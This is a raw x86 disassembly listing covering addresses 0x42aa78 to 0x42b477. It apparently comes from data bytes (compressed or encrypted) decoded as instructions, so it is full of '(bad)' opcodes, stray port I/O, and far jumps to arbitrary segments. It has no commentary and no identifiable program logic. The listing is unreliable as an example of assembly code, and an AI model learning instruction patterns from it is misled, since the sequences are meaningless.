  42aa78:	add    al,0xfe
  42aa7a:	pop    esp
  42aa7b:	lock sbb eax,0x4b90e414
  42aa81:	inc    esi
  42aa82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa83:	xor    BYTE PTR [edx*8+0x5bed015],al
  42aa8a:	inc    esi
  42aa8b:	sub    DWORD PTR [edi+0x762276a6],eax
  42aa91:	and    eax,0x259bb9f0
  42aa96:	cli    
  42aa97:	call   0x4f244d1c
  42aa9c:	mov    bh,0xda
  42aa9e:	sahf   
  42aa9f:	cmp    ebx,esi
  42aaa1:	adc    cl,BYTE PTR [ecx-0x357564a2]
  42aaa7:	and    eax,0x9b13d14b
  42aaac:	push   esp
  42aaad:	ins    BYTE PTR es:[edi],dx
  42aaae:	cli    
  42aaaf:	outs   dx,DWORD PTR ds:[esi]
  42aab0:	inc    eax
  42aab1:	stc    
  42aab2:	jp     0x42aac0
  42aab4:	fnstenv [ebx+0x640c730d]
  42aaba:	aas    
  42aabb:	or     edx,DWORD PTR [edi]
  42aabd:	mov    edx,DWORD PTR [esi]
  42aabf:	push   ebx
  42aac0:	and    eax,0x8d5e2d67
  42aac5:	add    edx,0x3c93f604
  42aacb:	add    eax,0x9d858640
  42aad0:	xor    DWORD PTR [eax],0xa8232aed
  42aad6:	adc    DWORD PTR [ecx+ebp*2],ebp
  42aad9:	retf   0x60f0
  42aadc:	xchg   esp,eax
  42aadd:	mov    ebx,0xb7bb0401
  42aae2:	jecxz  0x42aad3
  42aae4:	and    al,0xb4
  42aae6:	movhps QWORD PTR [edi+0x1f],xmm7
  42aaea:	xor    eax,0x39a3fef5
  42aaef:	test   BYTE PTR [edx+0x7d],dh
  42aaf2:	sub    bh,BYTE PTR ds:0xf8c38e40
  42aaf8:	test   al,0xfc
  42aafa:	fild   QWORD PTR [ebx-0x66]
  42aafd:	sar    BYTE PTR [edx+0x6d],1
  42ab00:	in     al,0xcd
  42ab02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ab03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab04:	(bad)  
  42ab05:	adc    dh,ah
  42ab07:	pop    eax
  42ab08:	inc    esp
  42ab09:	pop    ss
  42ab0a:	dec    esi
  42ab0b:	pop    esi
  42ab0c:	pop    edx
  42ab0d:	call   0x437c02
	...
  42ab72:	add    BYTE PTR [eax],al
  42ab74:	ds push cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	aad    0xd2
  42ab82:	rcl    eax,cl
  42ab84:	test   al,0xc8
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	jno    0x42abff
  42ab8e:	inc    edx
  42ab8f:	in     eax,dx
  42ab90:	jno    0x42abff
  42ab92:	inc    edi
  42ab93:	jae    0x42ab71
  42ab95:	test   BYTE PTR [edi],cl
  42ab97:	push   eax
  42ab98:	imul   ebp,DWORD PTR ss:[ecx+0x79],0x4e
  42ab9d:	add    al,0x1b
  42ab9f:	repz sub DWORD PTR [edi-0x2bbd6362],ecx
  42aba6:	fnsave [ebx+edi*8]
  42aba9:	jle    0x42abe4
  42abab:	adc    al,0x5b
  42abad:	mov    esp,ds
  42abaf:	mov    ebp,0xd6f41b8
  42abb4:	cwde   
  42abb5:	or     DWORD PTR [esp+ecx*4-0x4813d5ab],esp
  42abbc:	test   eax,0x73a04a5a
  42abc1:	retf   0x3ee3
  42abc4:	xchg   esp,eax
  42abc5:	iretw  
  42abc7:	scas   eax,DWORD PTR es:[edi]
  42abc8:	sub    edi,ebp
  42abca:	mov    cl,0xb9
  42abcc:	aad    0xb7
  42abce:	jbe    0x42ab9c
  42abd0:	cmp    dh,cl
  42abd2:	xor    esi,DWORD PTR [edi-0x34]
  42abd5:	pop    ecx
  42abd6:	mov    ecx,0xbdef2f21
  42abdb:	push   ebp
  42abdc:	sub    al,0x3d
  42abde:	jno    0x42abe0
  42abe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42abe1:	jmp    0xeee:0x1b2c4973
  42abe8:	sub    DWORD PTR [edx+0x136f3a4f],edi
  42abee:	sub    ebp,DWORD PTR [eax]
  42abf0:	lahf   
  42abf1:	or     ecx,esp
  42abf3:	fst    QWORD PTR [edx-0x2d]
  42abf6:	push   0x1
  42abf8:	xlat   BYTE PTR ds:[ebx]
  42abf9:	shr    bl,1
  42abfb:	mov    WORD PTR [eax],?
  42abfd:	push   0xaa19ce80
  42ac02:	scas   eax,DWORD PTR es:[edi]
  42ac03:	sub    esi,DWORD PTR [edi]
  42ac05:	clc    
  42ac06:	inc    ecx
  42ac07:	adc    DWORD PTR [edx],edi
  42ac09:	inc    ecx
  42ac0a:	pop    ecx
  42ac0b:	mov    ah,0x62
  42ac0d:	ins    DWORD PTR es:[edi],dx
  42ac0e:	add    DWORD PTR [edi-0x48],esp
  42ac11:	and    BYTE PTR [edx],dl
  42ac13:	neg    BYTE PTR [ebx]
  42ac15:	pushf  
  42ac16:	inc    ecx
  42ac17:	mov    ecx,0xf1a999d9
  42ac1c:	add    eax,0x11935540
  42ac21:	xor    edi,ecx
  42ac23:	push   ebx
  42ac24:	sbb    eax,0xb63d02d1
  42ac29:	pop    ebp
  42ac2a:	bound  eax,QWORD PTR [ebx+0x2256575f]
  42ac30:	jnp    0x42ac99
  42ac32:	cmp    eax,0xd5c77da4
  42ac37:	sbb    eax,0x4c2dee6b
  42ac3c:	in     eax,dx
  42ac3d:	sub    eax,0xf3772692
  42ac42:	sub    DWORD PTR [eax-0x42f7c5a2],edi
  42ac48:	push   0x12fc06d5
  42ac4d:	cmp    bh,0xe0
  42ac50:	(bad)  
  42ac51:	cmp    BYTE PTR cs:[ebp+0x24],dl
  42ac55:	(bad)  
  42ac56:	adc    DWORD PTR [edi+0x6699adaa],ebp
  42ac5c:	mul    BYTE PTR [ebx]
  42ac5e:	sub    ebx,eax
  42ac60:	xchg   ecx,eax
  42ac61:	pop    esp
  42ac62:	push   ecx
  42ac63:	mov    bh,0x34
  42ac65:	(bad)  
  42ac66:	sub    DWORD PTR [edx],esi
  42ac68:	pop    ds
  42ac69:	push   edx
  42ac6a:	faddp  st(5),st
  42ac6c:	dec    ebp
  42ac6d:	xchg   ebp,eax
  42ac6e:	ins    BYTE PTR es:[edi],dx
  42ac6f:	retf   
  42ac70:	mov    bh,0x63
  42ac72:	outs   dx,DWORD PTR ds:[esi]
  42ac73:	and    cl,BYTE PTR ds:[ebx-0x41]
  42ac77:	inc    edi
  42ac78:	push   edi
  42ac79:	push   0xc48c820a
  42ac7e:	ds stos BYTE PTR es:[edi],al
  42ac80:	push   es
  42ac81:	jmp    0x42acb9
  42ac83:	xchg   edi,eax
  42ac84:	imul   ebx,esp,0xd6be16b2
  42ac8a:	push   cs
  42ac8b:	cmp    BYTE PTR [eax-0x1b],0xca
  42ac8f:	cmp    al,0x0
	...
  42acf1:	add    BYTE PTR [eax],al
  42acf3:	add    cl,ch
  42acf5:	xor    bl,BYTE PTR [edx+edi*1]
  42acf8:	fistp  QWORD PTR [esi]
  42acfa:	out    dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	in     eax,dx
  42ad01:	loope  0x42acd5
  42ad03:	adc    ebp,DWORD PTR [ecx+ecx*8+0x1040001]
  42ad0a:	add    BYTE PTR [eax],al
  42ad0c:	jb     0x42ad4a
  42ad0e:	xchg   ecx,eax
  42ad0f:	xchg   ebx,eax
  42ad10:	dec    edi
  42ad11:	lds    ecx,FWORD PTR [ecx+0x7ad231e8]
  42ad17:	push   cs
  42ad18:	sub    DWORD PTR [ebp-0x1994ba53],edx
  42ad1e:	loope  0x42ad11
  42ad20:	call   0x67fb:0x1f1f7bc
  42ad27:	jnp    0x42acfe
  42ad29:	inc    edx
  42ad2a:	xchg   BYTE PTR [ecx],bh
  42ad2c:	loope  0x42ad01
  42ad2e:	pop    esi
  42ad2f:	sbb    bl,BYTE PTR [ebp-0x53]
  42ad32:	rcr    BYTE PTR [edi-0x6d1bcc40],1
  42ad38:	xchg   esi,eax
  42ad39:	hlt    
  42ad3a:	pop    ebp
  42ad3b:	and    al,0x34
  42ad3d:	jp     0x42acf6
  42ad3f:	test   al,0x44
  42ad42:	in     al,0xf9
  42ad44:	js     0x42acf2
  42ad46:	jge    0x42ad0f
  42ad48:	pop    ss
  42ad49:	cld    
  42ad4a:	mov    bh,0x4e
  42ad4c:	inc    esi
  42ad4d:	jb     0x42acd1
  42ad4f:	or     eax,0x82e3c092
  42ad54:	mov    ds:0xb0d0651c,eax
  42ad59:	lock sbb al,0x28
  42ad5c:	pop    ss
  42ad5d:	dec    edi
  42ad5e:	neg    DWORD PTR [ecx-0x23]
  42ad61:	loopne 0x42ad48
  42ad63:	(bad)  
  42ad64:	int3   
  42ad65:	out    dx,eax
  42ad66:	pop    eax
  42ad67:	sahf   
  42ad68:	fmul   QWORD PTR [esi]
  42ad6a:	inc    edi
  42ad6b:	dec    edx
  42ad6c:	shl    DWORD PTR [edx+0x55],cl
  42ad6f:	es pop esp
  42ad71:	arpl   dx,si
  42ad73:	jmp    0x9c41:0xf15e9c32
  42ad7a:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad7c:	lods   al,BYTE PTR ds:[esi]
  42ad7d:	sub    eax,0x1c9a123e
  42ad82:	sub    eax,0xb17cc67d
  42ad87:	or     al,0xab
  42ad89:	push   ds
  42ad8a:	sbb    bl,BYTE PTR [ebx+0x54e81d44]
  42ad90:	add    esp,esp
  42ad92:	fs test ch,dh
  42ad95:	test   BYTE PTR [ebp-0x16],bl
  42ad98:	cld    
  42ad99:	xchg   ecx,eax
  42ad9a:	enter  0x3b56,0x97
  42ad9e:	inc    ebp
  42ad9f:	adc    ebp,edi
  42ada1:	cmp    eax,0x5ba20688
  42ada6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ada7:	mov    dl,0x2e
  42ada9:	test   eax,0xefc53c45
  42adae:	pop    ebx
  42adaf:	push   ecx
  42adb0:	stos   DWORD PTR es:[edi],eax
  42adb1:	leave  
  42adb2:	popf   
  42adb3:	jnp    0x42ad42
  42adb5:	stos   BYTE PTR es:[edi],al
  42adb6:	sub    al,0x35
  42adb8:	sub    al,0x68
  42adba:	test   DWORD PTR [edi+ebx*8-0x27c7491e],0xee998996
  42adc5:	dec    esp
  42adc6:	xchg   ebp,eax
  42adc7:	sbb    bh,BYTE PTR [ecx+0x14612f2d]
  42adcd:	sti    
  42adce:	cmp    eax,0xa91ed81c
  42add3:	mov    al,0x1d
  42add5:	and    al,0x78
  42add7:	mov    esi,0x58892d5b
  42addc:	mov    dh,dh
  42adde:	pop    esi
  42addf:	mov    ebx,0x4bc8ba5
  42ade4:	popa   
  42ade5:	inc    edx
  42ade6:	adc    ecx,DWORD PTR [ebp-0x162aabfd]
  42adec:	std    
  42aded:	mov    ss,WORD PTR [edx-0x1bb29f04]
  42adf3:	jae    0x42ae24
  42adf5:	mov    bl,0x21
  42adf7:	mov    bh,0x6
  42adf9:	cdq    
  42adfa:	and    DWORD PTR [ecx+0x68],ebp
  42adfd:	cs (bad) 
  42adff:	add    ch,BYTE PTR [eax-0x4a0bdac5]
  42ae05:	mov    BYTE PTR [ebx-0x6c],dh
  42ae08:	mov    bh,0xcc
  42ae0a:	sub    DWORD PTR [ebx],ecx
  42ae0c:	xchg   ebx,eax
  42ae0d:	inc    ecx
  42ae0e:	xchg   esp,eax
  42ae0f:	jmp    0x42ae14
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	lahf   
  42ae81:	fstp   TBYTE PTR [ecx+0x1cab013]
  42ae87:	add    BYTE PTR [ecx+eax*1],al
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	gs fmulp st(1),st
  42ae8f:	sub    eax,0x91982c24
  42ae94:	push   es
  42ae95:	fsub   DWORD PTR [esi+eax*2]
  42ae98:	inc    edi
  42ae99:	retf   0xed8f
  42ae9c:	push   ebp
  42ae9d:	push   edx
  42ae9e:	jp     0x42aea0
  42aea0:	fbld   TBYTE PTR [edi]
  42aea2:	out    dx,al
  42aea3:	inc    eax
  42aea4:	jge    0x42aef8
  42aea6:	mov    dl,0x8b
  42aea8:	mov    bh,0xb8
  42aeaa:	fcom   QWORD PTR [ebp+0x64010d94]
  42aeb0:	push   edi
  42aeb1:	dec    esp
  42aeb2:	pop    edi
  42aeb3:	mov    edx,0x5c1d10a
  42aeb8:	jb     0x42ae72
  42aeba:	cwde   
  42aebb:	mov    edi,DWORD PTR [edi-0x1b]
  42aebe:	push   eax
  42aebf:	cmp    eax,0xc200e515
  42aec4:	adc    esi,DWORD PTR ds:0x69abd42b
  42aeca:	scas   eax,DWORD PTR es:[edi]
  42aecb:	or     dl,BYTE PTR [eax-0x428f534c]
  42aed1:	repz loop 0x42af1e
  42aed4:	mov    eax,ds:0x176e12cc
  42aed9:	mov    dl,0x4d
  42aedb:	mov    DWORD PTR [ecx-0x4f2d5c32],esi
  42aee1:	push   esp
  42aee2:	into   
  42aee3:	jecxz  0x42af12
  42aee5:	stc    
  42aee6:	ins    DWORD PTR es:[edi],dx
  42aee7:	aad    0x1e
  42aee9:	ins    DWORD PTR es:[edi],dx
  42aeea:	sub    BYTE PTR [ebx],dh
  42aeec:	dec    eax
  42aeee:	das    
  42aeef:	(bad)  
  42aef0:	ficomp DWORD PTR [eax]
  42aef2:	add    BYTE PTR [ecx-0x1],0x41
  42aef6:	test   DWORD PTR [edx],ebx
  42aef8:	mov    ebp,gs
  42aefa:	pop    ebp
  42aefb:	and    eax,0xbe636468
  42af00:	push   ecx
  42af01:	xchg   ecx,eax
  42af02:	mov    bl,0x5c
  42af04:	(bad)  [ecx+0x4b8634ae]
  42af0a:	dec    ecx
  42af0b:	push   eax
  42af0c:	xlat   BYTE PTR ds:[ebx]
  42af0d:	jno    0x42aea5
  42af0f:	dec    ebx
  42af10:	popw   fs
  42af13:	aam    0x8b
  42af15:	(bad)  
  42af17:	dec    esi
  42af18:	jo     0x42aea9
  42af1a:	aad    0x90
  42af1c:	jmp    0xad81:0x1a36d2f3
  42af23:	and    bl,BYTE PTR [ebx-0x5]
  42af26:	inc    edi
  42af27:	inc    ebp
  42af28:	popf   
  42af29:	xchg   esp,eax
  42af2a:	sub    ebx,DWORD PTR [eax+0x50f7eba1]
  42af30:	jne    0x42af74
  42af32:	jg     0x42aecf
  42af34:	pop    es
  42af35:	into   
  42af36:	les    edx,FWORD PTR [edx]
  42af38:	inc    esi
  42af39:	jbe    0x42aecd
  42af3b:	push   edi
  42af3c:	dec    edi
  42af3d:	call   0x5447:0xa4a61d12
  42af44:	push   eax
  42af45:	bnd jno 0x42af88
  42af48:	adc    ebx,DWORD PTR [ebx]
  42af4a:	imul   ecx,DWORD PTR [edi],0xdafb6286
  42af50:	dec    ecx
  42af51:	mov    ebx,0x4331da91
  42af56:	scas   al,BYTE PTR es:[edi]
  42af57:	cdq    
  42af58:	mov    al,ds:0x16677c9e
  42af5d:	sbb    DWORD PTR [esi+0x20],edx
  42af60:	inc    edx
  42af61:	out    dx,eax
  42af62:	icebp  
  42af63:	stos   BYTE PTR es:[edi],al
  42af64:	out    0x9,al
  42af66:	retf   
  42af67:	arpl   WORD PTR [ecx-0x75840149],bp
  42af6d:	test   BYTE PTR [ecx+0x46],dh
  42af70:	loopne 0x42af5a
  42af72:	int    0xfe
  42af74:	clc    
  42af75:	pop    ebp
  42af76:	adc    bl,BYTE PTR [eax]
  42af78:	shr    BYTE PTR [edi+0x3e1e7852],cl
  42af7e:	rcr    esp,cl
  42af80:	jg     0x42af7c
  42af82:	leave  
  42af83:	or     ebp,DWORD PTR [eax]
  42af85:	sbb    esp,esi
  42af87:	or     dl,BYTE PTR [ebp+0x5a]
  42af8a:	jecxz  0x42afe9
  42af8c:	mov    esi,cs
  42af8e:	sub    esp,ecx
	...
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	in     al,dx
  42b001:	test   ebp,ebx
  42b003:	push   0x1cbb4
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	adc    dl,ah
  42b00e:	xchg   ebp,eax
  42b00f:	mov    al,ds:0xdc5e9489
  42b014:	call   0xaecc:0x8d2e5b1c
  42b01b:	fdivr  DWORD PTR [edi+0x69a33351]
  42b021:	fldcw  WORD PTR [ebx]
  42b023:	pop    edx
  42b024:	sub    al,0x10
  42b026:	cld    
  42b027:	cli    
  42b028:	hlt    
  42b029:	out    0x92,eax
  42b02b:	xchg   ecx,eax
  42b02c:	sti    
  42b02d:	in     al,dx
  42b02e:	dec    edi
  42b02f:	jg     0x42b019
  42b031:	lock jmp 0x42b084
  42b034:	xchg   esp,eax
  42b035:	inc    ecx
  42b036:	sbb    DWORD PTR [edi],0xffffffce
  42b039:	ins    BYTE PTR es:[edi],dx
  42b03a:	mov    bl,0x31
  42b03c:	xchg   DWORD PTR [ebp+0x75],esp
  42b03f:	not    DWORD PTR [edx+0x2b]
  42b042:	add    BYTE PTR [edx],al
  42b044:	clc    
  42b045:	mov    esp,0xb4fbf39a
  42b04a:	pop    ecx
  42b04b:	or     esp,eax
  42b04d:	jbe    0x42aff9
  42b04f:	jl     0x42b065
  42b051:	clc    
  42b052:	jne    0x42b04d
  42b054:	mov    DWORD PTR [ebx-0x63],esi
  42b057:	push   eax
  42b058:	pop    ss
  42b059:	cwde   
  42b05a:	aad    0x95
  42b05c:	sbb    al,0x8c
  42b05e:	jae    0x42b094
  42b060:	cmp    BYTE PTR [ebx-0x7d],0xb5
  42b064:	cmp    eax,0x386a8456
  42b069:	out    dx,al
  42b06a:	shl    al,cl
  42b06c:	mov    ebx,0x75b31be8
  42b071:	aaa    
  42b072:	cdq    
  42b073:	popf   
  42b074:	ret    0x40af
  42b077:	pop    ebx
  42b078:	mov    ecx,0xf5a89921
  42b07d:	dec    ebp
  42b07e:	mov    ch,0xd0
  42b080:	or     al,0x46
  42b082:	xor    dl,bl
  42b084:	or     al,0x38
  42b086:	push   eax
  42b087:	adc    al,BYTE PTR [esi+0x1c]
  42b08a:	test   BYTE PTR [esi],dl
  42b08c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b08d:	jge    0x42b05a
  42b08f:	call   0x2377b0
  42b094:	mov    bh,0x55
  42b096:	imul   edx,esi,0xfffffff9
  42b099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b09a:	retf   0xf30f
  42b09d:	jg     0x42b0e1
  42b09f:	imul   edi,DWORD PTR [si-0x3c1d],0xfffffff4
  42b0a5:	xor    DWORD PTR [ecx+0x8],esp
  42b0a8:	inc    esp
  42b0a9:	int3   
  42b0aa:	mov    edi,0xe306de7b
  42b0af:	sbb    DWORD PTR [eax+ebx*1-0x5b],ecx
  42b0b3:	cdq    
  42b0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0b5:	adc    ebp,eax
  42b0b7:	xlat   BYTE PTR ds:[ebx]
  42b0b8:	jb     0x42b107
  42b0ba:	add    eax,DWORD PTR [edx+edi*2-0x8]
  42b0be:	mov    esi,0xea895f0b
  42b0c3:	(bad)  
  42b0c4:	(bad)  
  42b0c5:	and    edi,DWORD PTR [ecx-0x611344e6]
  42b0cb:	adc    bh,BYTE PTR [esp+ecx*1]
  42b0ce:	jne    0x42b08f
  42b0d0:	cmp    eax,0x551559cf
  42b0d5:	iret   
  42b0d6:	cmp    al,0xcf
  42b0d8:	sbb    ax,0xd872
  42b0dc:	mov    al,0x4a
  42b0de:	ffree  st(2)
  42b0e0:	lahf   
  42b0e1:	sbb    DWORD PTR [edx+eax*4-0x22],edi
  42b0e5:	push   ss
  42b0e6:	adc    BYTE PTR [edx+0x9212028],0xe0
  42b0ed:	adc    bl,0xff
  42b0f0:	xor    DWORD PTR [esi+edi*8+0x29],eax
  42b0f4:	shl    ecx,1
  42b0f6:	aam    0x12
  42b0f8:	dec    edx
  42b0f9:	xchg   BYTE PTR [ecx+0x44ef592c],al
  42b0ff:	stos   BYTE PTR es:[edi],al
  42b100:	loop   0x42b124
  42b102:	sar    DWORD PTR cs:[ebp+0x44903ea3],0x32
  42b10a:	xchg   ecx,eax
  42b10b:	imul   esi,DWORD PTR [ebx+ebx*2+0x3980],0x0
	...
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	adc    edx,DWORD PTR [ecx+ecx*4-0x1b]
  42b184:	mov    eax,0x40001cc
  42b189:	add    DWORD PTR [eax],eax
  42b18b:	add    dl,dl
  42b18d:	inc    esi
  42b18e:	arpl   WORD PTR [ebx+edi*8+0x4ffeb2a4],di
  42b195:	loopne 0x42b139
  42b197:	xor    eax,0x6c1b7c60
  42b19c:	cs je  0x42b1da
  42b19f:	mov    WORD PTR [eax-0x384a4a7a],?
  42b1a5:	dec    ebx
  42b1a6:	add    DWORD PTR cs:[edx-0x51],ecx
  42b1aa:	pop    esi
  42b1ac:	bnd jo 0x42b1a5
  42b1af:	dec    eax
  42b1b0:	dec    edx
  42b1b1:	and    eax,0x3d3d404e
  42b1b6:	stc    
  42b1b7:	jne    0x42b20b
  42b1b9:	int3   
  42b1ba:	xchg   edi,eax
  42b1bb:	test   BYTE PTR [eax+eax*2+0x35],ch
  42b1bf:	sar    DWORD PTR [ebp-0x8],0xe9
  42b1c3:	dec    ecx
  42b1c4:	pop    ebx
  42b1c5:	out    0x2a,al
  42b1c7:	aaa    
  42b1c8:	sub    DWORD PTR [eax+0x1],edi
  42b1cb:	sub    al,0x5d
  42b1cd:	inc    esi
  42b1ce:	jge    0x42b1b3
  42b1d0:	jno    0x42b1d0
  42b1d2:	dec    ebp
  42b1d3:	adc    ch,BYTE PTR [esi+0x554aeb15]
  42b1d9:	pop    eax
  42b1da:	sbb    al,BYTE PTR [ebx+0x12570dbc]
  42b1e0:	fstp   TBYTE PTR [ecx-0x436fa1dd]
  42b1e6:	in     eax,dx
  42b1e7:	retf   
  42b1e8:	pop    eax
  42b1e9:	cmp    DWORD PTR [edx+0x34077d14],ebx
  42b1ef:	fwait
  42b1f0:	or     dh,ah
  42b1f2:	mov    WORD PTR [eax],ss
  42b1f4:	out    0x27,eax
  42b1f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b1f7:	in     al,0x28
  42b1f9:	push   edi
  42b1fa:	jp     0x42b259
  42b1fc:	aam    0xab
  42b1fe:	daa    
  42b1ff:	out    0x85,al
  42b201:	outs   dx,BYTE PTR ds:[esi]
  42b202:	dec    edi
  42b203:	pop    edx
  42b204:	in     al,0xb2
  42b206:	sbb    al,dl
  42b208:	icebp  
  42b209:	jmp    0x42b22e
  42b20b:	pop    edi
  42b20c:	cmp    al,0x9f
  42b20e:	das    
  42b20f:	pop    esp
  42b210:	sub    eax,0x8eca9508
  42b215:	cmp    al,0x7f
  42b217:	mov    bh,0xba
  42b219:	push   es
  42b21a:	xchg   ebx,eax
  42b21b:	fild   QWORD PTR [ecx+0x676c70e5]
  42b221:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b222:	pop    edx
  42b223:	push   ebp
  42b224:	scas   al,BYTE PTR es:[edi]
  42b225:	pop    ebp
  42b226:	jbe    0x42b21d
  42b228:	lea    esi,[ecx-0x36]
  42b22b:	mov    eax,ds:0x38cc2693
  42b230:	sub    al,0xe9
  42b232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b233:	fsub   QWORD PTR [edi]
  42b235:	and    DWORD PTR [esi-0x4b],edx
  42b238:	mov    ds:0x64ad514c,eax
  42b23d:	loop   0x42b274
  42b23f:	xchg   DWORD PTR [ecx],eax
  42b241:	push   cs
  42b242:	sub    DWORD PTR [eax+0x7d],0x35
  42b246:	lahf   
  42b247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b248:	stos   DWORD PTR es:[edi],eax
  42b249:	or     BYTE PTR [eax],bh
  42b24b:	or     eax,0xe8b6f366
  42b250:	inc    ebp
  42b251:	clc    
  42b252:	cmp    eax,0x7ca159f3
  42b257:	ret    0x8d88
  42b25a:	fs push edi
  42b25c:	daa    
  42b25d:	fdiv   DWORD PTR [edi+0x7012937f]
  42b263:	dec    eax
  42b264:	popw   ss
  42b266:	mov    ebp,0x2c06f0a4
  42b26b:	pop    eax
  42b26c:	sbb    DWORD PTR [edx-0x12616368],ebx
  42b272:	dec    edi
  42b273:	push   0xb02c944d
  42b278:	fdivr  QWORD PTR [eax+0x6433908e]
  42b27e:	iret   
  42b27f:	fild   WORD PTR [ebx+0x20]
  42b282:	xchg   ebx,eax
  42b283:	dec    esi
  42b284:	sub    eax,0x2a40e122
  42b289:	adc    bh,cl
  42b28b:	loope  0x42b240
  42b28d:	xor    BYTE PTR [esi],ah
  42b28f:	dec    ebp
	...
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0xd8738e65
  42b301:	pop    esi
  42b302:	sub    bh,ah
  42b304:	mov    esp,0x40001cd
  42b309:	add    DWORD PTR [eax],eax
  42b30b:	add    al,al
  42b30d:	mov    es,WORD PTR [edi]
  42b30f:	daa    
  42b310:	test   BYTE PTR [esi],dh
  42b312:	inc    eax
  42b313:	hlt    
  42b314:	popa   
  42b315:	cmp    eax,DWORD PTR [ecx+edi*8]
  42b318:	add    DWORD PTR [eax+0x361a6e5c],ebx
  42b31e:	nop
  42b31f:	loopne 0x42b2fe
  42b321:	push   esi
  42b322:	rcr    dl,1
  42b324:	in     al,dx
  42b325:	xchg   ecx,eax
  42b326:	jno    0x42b326
  42b328:	hlt    
  42b329:	dec    edx
  42b32a:	enter  0x21ba,0xe7
  42b32e:	inc    ecx
  42b32f:	ds call 0xe4602484
  42b335:	les    esp,FWORD PTR [eax]
  42b337:	inc    esp
  42b338:	in     al,dx
  42b339:	aad    0xc5
  42b33b:	data16 jbe 0x42b2c2
  42b33e:	(bad)  
  42b33f:	imul   ebx,ebx,0x55df09ab
  42b345:	fild   WORD PTR [ecx+edx*1-0x4d]
  42b349:	inc    esp
  42b34a:	adc    al,0xb6
  42b34c:	in     al,0x6
  42b34e:	fdiv   QWORD PTR [edx+eiz*4]
  42b351:	outs   dx,DWORD PTR ds:[esi]
  42b352:	jge    0x42b349
  42b354:	clc    
  42b355:	xchg   DWORD PTR [ecx+0x485f0f18],edx
  42b35b:	jecxz  0x42b384
  42b35d:	jg     0x42b3db
  42b35f:	leave  
  42b360:	mov    ds:0xbf84bf2a,eax
  42b365:	sbb    DWORD PTR [edx+0x5ef2bc36],0xc8cc3121
  42b36f:	daa    
  42b370:	imul   esp,DWORD PTR ds:0x5f5f5c65,0x541400ae
  42b37a:	in     eax,0x7f
  42b37c:	fwait
  42b37d:	int    0x83
  42b37f:	sbb    BYTE PTR [ecx+0x53780af0],ah
  42b385:	mov    eax,0xfe912659
  42b38a:	and    DWORD PTR [ebp-0x3d4b14c5],esi
  42b390:	adc    DWORD PTR [edi+0x32],ebp
  42b393:	cli    
  42b394:	iret   
  42b395:	ret    0x4e67
  42b398:	xchg   eax,edi
  42b39a:	ret    0x8ee6
  42b39d:	inc    edx
  42b39e:	fdivr  QWORD PTR [ecx+0x682852ea]
  42b3a4:	dec    ebp
  42b3a5:	and    ebp,DWORD PTR [eax]
  42b3a7:	loop   0x42b405
  42b3a9:	sbb    eax,DWORD PTR [ebx]
  42b3ab:	jae    0x42b37b
  42b3ad:	xchg   BYTE PTR [ebx],bh
  42b3af:	xlat   BYTE PTR ds:[ebx]
  42b3b0:	mov    esi,0x4a17e6cc
  42b3b5:	xor    esi,DWORD PTR es:[ebx-0x2fed4c67]
  42b3bc:	inc    eax
  42b3bd:	push   es
  42b3be:	cli    
  42b3bf:	and    ecx,DWORD PTR [ecx+0x434ffd4a]
  42b3c5:	mov    ch,0x80
  42b3c7:	test   BYTE PTR [ebx+0x57],al
  42b3ca:	(bad)  
  42b3cb:	call   0x9595:0x2326e0c4
  42b3d2:	pop    ds
  42b3d3:	jge    0x42b3b1
  42b3d5:	cmp    al,0x80
  42b3d7:	dec    edi
  42b3d8:	inc    ebp
  42b3d9:	xor    esi,esi
  42b3db:	pop    esi
  42b3dc:	sahf   
  42b3dd:	jo     0x42b388
  42b3df:	int    0x13
  42b3e1:	push   esp
  42b3e2:	enter  0xa208,0x48
  42b3e6:	lods   al,BYTE PTR ds:[esi]
  42b3e7:	enter  0x3bae,0xad
  42b3eb:	mov    al,ds:0x5d67d9a7
  42b3f0:	adc    al,0x99
  42b3f2:	sbb    DWORD PTR [edi-0x5],edi
  42b3f5:	(bad)  
  42b3f6:	imul   esp,DWORD PTR [edx+ecx*2-0x54],0x24
  42b3fb:	into   
  42b3fc:	add    al,0xe8
  42b3fe:	jl     0x42b3c0
  42b400:	test   al,0xe8
  42b402:	mov    al,0x51
  42b404:	(bad)  
  42b406:	rcl    esp,0x8f
  42b409:	sbb    DWORD PTR [edx+0x742b44ad],0x43
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
